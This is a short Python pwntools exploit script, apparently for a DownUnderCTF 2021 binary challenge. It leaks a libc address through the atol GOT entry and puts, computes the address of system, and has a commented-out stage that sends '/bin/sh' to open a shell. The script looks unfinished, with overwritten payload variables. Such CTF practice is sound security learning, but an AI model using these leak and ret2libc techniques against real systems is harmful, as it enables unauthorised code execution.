from pwn import *

debug = False

if(debug):
	r = process("./rbp")
	#gdb.attach(r)
	atol_off = 0x0000000000047750
	system_off = 0x0000000000055410
else:
	r = remote("pwn-2021.duc.tf", 31910)
	atol_off = 0x0000000000042210
	system_off = 0x000000000004fa60
	puts_off = 0x0000000000809d0

r.recvuntil(b'Hi there! What is your name?')

atol_got = 0x000000000404038
main = 0x4011d5
read_long = 0x4011a9
read_long = 0x0000000000401239
pop3_ret = 0x00000000004012af
printf = 0x401040
puts = 0x401030
pop_rdi_ret = 0x00000000004012b3


payload1 = p64(puts) + p64(main) + p64(atol_got)
#payload1 = p64(printf) + p64(puts) + p64(atol_got) 
r.send(payload1) 
r.recvuntil(b'Do you have a favourite number?')

# 6 6752 2656 10848  14944  19040  23136  43616
#payload2 = b"-40" + b"%23136x" + b"%7$hn" + b'\x00' 
payload2 = b"-40" + b"abcde" 
payload2 += p64(puts)
payload2 += p64(pop3_ret)[:3]

payload2 = b"-40"
r.send(payload2)


stuff = r.recvall()
print(stuff)

#stuff = r.recvall().split(b"\n")[0][-6:]
#stuff = int.from_bytes(stuff, "little")
#print(hex(stuff))
#print(hex(stuff - atol_off + system_off))

'''
payload3 = b"/bin/sh\x00"
payload3 += b'b'*(0x13 - len(payload3))

r.send(payload3)

sleep(1)

r.sendline("ls")

print(r.recvall())

#r.interactive()
'''